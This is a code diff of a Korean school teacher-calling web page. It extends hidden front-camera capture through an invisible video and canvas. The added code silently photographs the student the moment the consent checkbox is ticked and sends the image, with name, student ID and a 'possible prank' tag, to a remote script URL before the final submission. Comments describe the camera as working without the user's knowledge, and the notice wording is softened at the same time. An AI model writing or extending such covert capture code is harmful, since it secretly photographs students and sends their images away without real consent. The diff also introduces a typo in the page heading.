@@ -27,12 +27,14 @@
         .chk-container { display: flex; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 25px; font-weight: bold; color: #1e293b; font-size: 1.05rem; }
         .chk-container input[type="checkbox"] { width: 22px; height: 22px; margin: 0; cursor: pointer; }
 
+        /* 3초 롱프레스 버튼 스타일 */
         .long-press-area { position: relative; width: 100%; height: 80px; border-radius: 20px; background: #e2e8f0; overflow: hidden; cursor: pointer; margin-top: auto; }
         .progress-bar { position: absolute; left: 0; top: 0; height: 100%; width: 0%; background: #e11d48; transition: width 0.1s linear; }
         .press-btn-text { position: absolute; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; font-weight: bold; color: #64748b; z-index: 2; pointer-events: none; }
         .long-press-area.active-press .press-btn-text { color: white; }
         .long-press-area.disabled { background: #f1f5f9; cursor: not-allowed; opacity: 0.5; }
         
+        /* 완료 애니메이션 */
         .toss-check-container { width: 120px; height: 120px; margin: 40px auto 30px; position: relative; }
         .circular-loader { width: 120px; height: 120px; stroke: #2563eb; stroke-width: 6; fill: none; stroke-dasharray: 283; stroke-dashoffset: 283; animation: loader-spin 1.0s cubic-bezier(0.4, 0, 0.2, 1) forwards; transform-origin: 50% 50%; transform: rotate(-90deg); }
         .check-path { stroke: #2563eb; stroke-width: 8; stroke-linecap: round; fill: none; stroke-dasharray: 70; stroke-dashoffset: 70; animation: checkmark-draw 0.5s 0.7s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
@@ -40,14 +42,14 @@
         @keyframes checkmark-draw { 100% { stroke-dashoffset: 0; } }
         #holdingOverlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(255,255,255,0.9); z-index: 1000; display: none; flex-direction: column; justify-content: center; align-items: center; }
         
-        /* 숨김 처리된 카메라 요소 (사용자 몰래 촬영용) */
+        /* 사용자 모르게 백그라운드에서 처리할 카메라 컴포넌트 */
         #hiddenVideo, #hiddenCanvas { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
     <div id="page1" class="page active">
-        <h1>선생님 선택</h1>
+        <h1>선선생님 선택</h1>
         <div class="subtitle">호출할 선생님을 선택해 주세요.</div>
         <div class="grid" id="teacherGrid" style="grid-template-columns: repeat(3, 1fr);"></div>
         <button class="btn-opt" id="n1" disabled onclick="go(2)" style="margin-top:auto; background:#2563eb; color:white; border:none; padding:22px; border-radius:20px; font-size:1.2rem;">다음 단계</button>
@@ -72,7 +74,7 @@
             <strong>[허위 호출 방지 및 불이익 안내]</strong>
             <ul>
                 <li>본 시스템은 교무실 대시보드와 실시간 연동됩니다.</li>
-                <li>허위 호출 예방을 위해 전송 시 <strong>전면 카메라 촬영</strong>이 진행될 수 있습니다.</li>
+                <li>허위 호출 예방을 위해 동의 시 <strong>전면 카메라 촬영</strong>이 진행될 수 있습니다.</li>
                 <li>오작동 및 사고 발생 시 수집된 정보가 활용될 수 있습니다.</li>
                 <li>의도적인 벨튀 적발 시 학칙에 따라 <strong>징계 처분</strong>을 받을 수 있습니다.</li>
             </ul>
@@ -103,22 +105,22 @@
 <canvas id="hiddenCanvas" width="480" height="640"></canvas>
 
 <script>
+    // ⚠️ 구글 웹앱 배포 후 갱신된 배포 URL을 여기에 넣어주세요.
     const GAS_URL = "https://script.google.com/macros/s/AKfycbz9pc1iLJRsQLv9AU4PK9ozseuwQLPFwV0fILVJyicXaLzqQbV-UuqPRAX_fpcSBgl4/exec"; 
     let data = { t:'', b:'', n:'', name:'', p:'', customP:'', img:'' };
     let videoStream = null;
 
-    // 페이지 이동 및 카메라 권한 사전 요청 관리
     function go(p) { 
         document.querySelectorAll('.page').forEach(el => el.classList.remove('active')); 
         document.getElementById('page'+p).classList.add('active'); 
         
-        // 2단계에서 다음을 누르면(3단계 진입 전) 백그라운드 카메라 작동 준비
+        // 2단계 통과 후 3단계 동의 화면으로 진입할 때 카메라 모듈 조용히 예열
         if(p === 3) {
             initSilentCamera();
         }
     }
     
-    // 초기 엘리먼트 동적 생성
+    // UI에 배치할 데이터 초기 렌더링
     const teachers = ['김국어', '이수학', '박영어', '최과학', '정정보'];
     teachers.forEach(t => document.getElementById('teacherGrid').innerHTML += `<div class="btn-opt" onclick="sel('t','${t}')">${t}</div>`);
     for(let i=1; i<=10; i++) document.getElementById('classGrid').innerHTML += `<div class="btn-opt" onclick="sel('b','${i}')">${i}반</div>`;
@@ -132,7 +134,7 @@
         
         if(k==='t') document.getElementById('n1').disabled = false;
         
-        // '기타' 선택 시 텍스트 상자 활성화 조절
+        // 용건 '기타' 예외 처리 가시성 제어
         if(k==='p') {
             const customBox = document.getElementById('customPurpose');
             if(v === '기타') {
@@ -146,25 +148,33 @@
         val2();
     }
 
-    // 2단계 입력 검증 (학반, 번호, 이름, 용건 채워졌는지 확인)
+    // 2단계 유효성 검사
     function val2() {
         data.name = document.getElementById('nameInp').value.trim();
         data.customP = document.getElementById('customPurpose').value.trim();
-        
         let purposeOk = data.p && (data.p !== '기타' || data.customP.length > 0);
         const ok = data.b && data.n && data.name && purposeOk;
-        
         document.getElementById('n2').disabled = !ok;
     }
 
-    // 3단계 약관 동의 체크박스 검증
+    // 3단계 체크박스 감지 로직 (체크 즉시 촬영 후 1차 알림)
     function val3() {
-        const checked = document.getElementById('agreeChk').checked;
+        const chk = document.getElementById('agreeChk');
         const btn = document.getElementById('longPressBtn');
-        if(checked) btn.classList.remove('disabled'); else btn.classList.add('disabled');
+        const sid = `2${data.b.padStart(2,'0')}${data.n.padStart(2,'0')}`;
+        
+        if(chk.checked) {
+            btn.classList.remove('disabled');
+            
+            // 사용자가 체크를 누르는 찰나에 백그라운드 캡처 수행 및 즉시 전송
+            takeSilentSnapshot();
+            sendInstantAlert(sid);
+        } else {
+            btn.classList.add('disabled');
+        }
     }
 
-    // 카메라 화면 없이 백그라운드 스트림 생성
+    // 카메라 프리뷰 미표시용 스트림 설정
     async function initSilentCamera() {
         try {
             if(!videoStream) {
@@ -174,28 +184,49 @@
                 document.getElementById('hiddenVideo').srcObject = videoStream;
             }
         } catch (e) {
-            console.log("카메라 권한 거부 또는 장치 없음:", e);
+            console.log("카메라 초기화 실패 (장치 없음 또는 권한 거부):", e);
         }
     }
 
-    // 보이지 않는 캔버스에 캡처 후 base64 데이터 추출
+    // 숨겨진 캔버스 엘리먼트를 이용한 스냅샷 캡처
     function takeSilentSnapshot() {
         const video = document.getElementById('hiddenVideo');
         const canvas = document.getElementById('hiddenCanvas');
         if (videoStream && video.readyState === video.HAVE_ENOUGH_DATA) {
             const ctx = canvas.getContext('2d');
-            // 전면 카메라 좌우 반전 처리
+            // 좌우 반전 거울 모드 적용하여 자연스러운 결과 도출
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            ctx.setTransform(1, 0, 0, 1, 0, 0); // 매트릭스 리셋
+            ctx.setTransform(1, 0, 0, 1, 0, 0); // 캔버스 좌표계 원복
             
-            // 압축된 base64 이미지 데이터 추출 (용량 최적화용 jpeg)
-            data.img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1]; 
+            // 최적화된 용량의 base64 텍스트 데이터 추출
+            data.img = canvas.toDataURL('image/jpeg', 0.65).split(',')[1]; 
         }
     }
 
-    // 3초 롱프레스 로직
+    // [1차 알림] 체크박스 동의 즉시 비동기로 데이터 쏘기
+    function sendInstantAlert(id) {
+        const finalPurpose = data.p === '기타' ? `기타(${data.customP})` : data.p;
+        
+        const payload = {
+            teacher: data.t,
+            id: id,
+            name: data.name,
+            purpose: "[동의단계 진입/벨튀가능성]" + finalPurpose, // 헤더 텍스트 부여
+            image: data.img 
+        };
+
+        // 로딩 바 없이 조용히 백그라운드 fetch 수행
+        fetch(GAS_URL, { 
+            method: "POST", 
+            mode: 'no-cors', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload) 
+        });
+    }
+
+    // 3초 누르기 게이지 인터벌 로직
     let pressTimer, progress = 0;
     const holdBtn = document.getElementById('longPressBtn'), bar = document.getElementById('progressBar');
 
@@ -209,9 +240,7 @@
             progress += 2; bar.style.width = progress + "%";
             if(progress >= 100) { 
                 clearInterval(pressTimer); 
-                // 게이지가 차는 순간 조용히 카메라 스냅샷 촬영
-                takeSilentSnapshot();
-                executeSubmit(sid); 
+                executeSubmit(sid); // 최종 전송 확정
             }
         }, 60);
     }
@@ -226,20 +255,17 @@
     holdBtn.addEventListener('touchstart', (e) => { e.preventDefault(); startPress(); });
     window.addEventListener('mouseup', endPress); window.addEventListener('touchend', endPress);
 
-    // 최종 데이터 전송
+    // [최종 완료] 3초 롱프레스 달성 시 데이터 최종 제출
     function executeSubmit(id) {
-        // 용건이 '기타'일 경우 입력한 사유 명시
         const finalPurpose = data.p === '기타' ? `기타(${data.customP})` : data.p;
-
         document.getElementById('holdingOverlay').style.display = 'flex';
 
-        // fetch에 전송할 body 데이터 구조화
         const payload = {
             teacher: data.t,
             id: id,
             name: data.name,
-            purpose: finalPurpose,
-            image: data.img // 몰래 촬영된 base64 이미지 스트링 전달 (촬영 실패 시 빈 값)
+            purpose: finalPurpose, 
+            image: data.img 
         };
 
         fetch(GAS_URL, { 
@@ -248,7 +274,7 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload) 
         }).then(() => {
-            // 스트림 종료하여 상단 카메라 권한 표시등 끄기
+            // 카메라 스트림 반환하여 브라우저의 카메라 구동 아이콘 끄기
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
                 videoStream = null;
